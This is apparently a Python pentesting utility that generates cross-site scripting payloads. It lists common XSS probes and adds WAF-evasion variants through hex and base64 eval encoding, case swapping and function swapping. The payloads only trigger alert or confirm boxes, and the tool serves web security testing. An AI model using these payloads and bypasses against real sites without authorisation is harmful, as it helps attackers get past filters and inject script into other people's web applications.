import random
import base64

class XSSGenerator:
    """
    Aggressive XSS Payload Generator for Pentesting.
    Includes bypass techniques for common WAFs.
    """
    def __init__(self):
        self.payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            'javascript:alert(1)',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<math><mtext><option><fake><script>alert(1)</script>'
        ]

    def get_obfuscated_payload(self, payload):
        """
        Applies basic obfuscation to a payload.
        """
        # Hex encoding
        hex_payload = "".join([f"\\x{ord(c):02x}" for c in payload])
        # Base64 encoding for script context
        b64_payload = base64.b64encode(payload.encode()).decode()
        
        return {
            "original": payload,
            "hex": hex_payload,
            "b64_eval": f"eval(atob('{b64_payload}'))"
        }

    def generate_aggressive_list(self):
        """
        Returns a list of aggressive payloads for automated scanning.
        """
        aggressive = []
        for p in self.payloads:
            aggressive.append(p)
            # Add some WAF bypass variations
            aggressive.append(p.replace('script', 'sCrIpT'))
            aggressive.append(p.replace('alert', 'confirm'))
        return aggressive

if __name__ == "__main__":
    gen = XSSGenerator()
    print("--- Aggressive XSS Payloads ---")
    for p in gen.generate_aggressive_list()[:10]:
        print(p)
